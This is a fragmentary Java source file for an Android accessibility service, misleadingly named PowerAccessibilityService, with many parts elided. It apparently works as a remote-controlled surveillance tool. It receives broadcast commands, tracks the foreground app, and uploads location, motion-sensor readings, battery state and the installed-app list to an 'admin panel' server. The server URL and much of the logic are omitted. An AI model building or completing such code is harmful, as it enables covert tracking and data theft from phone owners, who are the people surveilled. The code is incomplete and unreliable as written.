...
public class PowerAccessibilityService extends AccessibilityService implements SensorEventListener {
    ...
    // --- URL to send data back to the admin panel ---
    ...
    protected void onServiceConnected() {
        ...
        // Initialize components needed by the service
        requestQueue = Volley.newRequestQueue(this);
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);

        // Register the broadcast receiver to listen for commands
        powerActionReceiver = new PowerActionReceiver();
        IntentFilter filter = new IntentFilter();
        // Add all possible command actions to the filter
    ...
    public boolean onUnbind(Intent intent) {
        ...
        sensorManager.unregisterListener(this); // Stop listening to sensors to save battery
        return super.onUnbind(intent);
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Keep track of the current app by listening to window state changes
    ...
    // --- BROADCAST RECEIVER TO HANDLE INCOMING COMMANDS ---
    ...
    private void getSensorData() {
        ...
        if (accelerometer == null && gyroscope == null && magnetometer == null) {
            submitDataToServer("sensor_error", "No motion sensors found on this device.");
            return;
        }
    ...
    public final void onSensorChanged(SensorEvent event) {
        ...
        try {
            ...
            if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) sensorType = "accelerometer";
            else if (event.sensor.getType() == Sensor.TYPE_GYROSCOPE) sensorType = "gyroscope";
            else if (event.sensor.getType() == Sensor.TYPE_MAGNETIC_FIELD) sensorType = "magnetometer_compass";
            
            if (!sensorType.isEmpty()) submitDataToServer(sensorType, sensorData);
        } catch (JSONException e) { Log.e(TAG, "JSON error creating sensor data", e); }
    ...
    private void openApp(String packageName) {
        try {
            ...
            if (launchIntent != null) {
                ...
                throw new Exception("Could not get launch intent.");
            }
        } catch (Exception e) {
            submitDataToServer("app_error", "Failed to open app: " + packageName);
        }
    }
            ...
            fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
                try {
                    if (location != null) {
                        ...
                        submitDataToServer("location_error", "Location permission may be denied or location is off.");
                    }
                } catch (JSONException e) { submitDataToServer("json_error", "Error creating location JSON."); }
            });
        } catch (SecurityException e) {
            submitDataToServer("location_error", "Location permission is not granted in AndroidManifest.");
        }
    }
    ...
    private void getBatteryStatus() {
        ...
        if (batteryStatus != null) {
            ...
            } catch (JSONException e) { submitDataToServer("json_error", "Error creating battery JSON."); }
        }
    }
    ...
    private void getAndUploadAppList() {
        try {
            ...
            submitDataToServer("app_list_error", "Failed to get app list. Check QUERY_ALL_PACKAGES permission.");
        }
    }
    ...
    private void submitDataToServer(String dataType, Object payload) {
        ...
        try {
            ...
            return; // Can't report error if we can't build the JSON
        }
        
        Log.d(TAG, "Submitting data to server. Type: " + dataType);
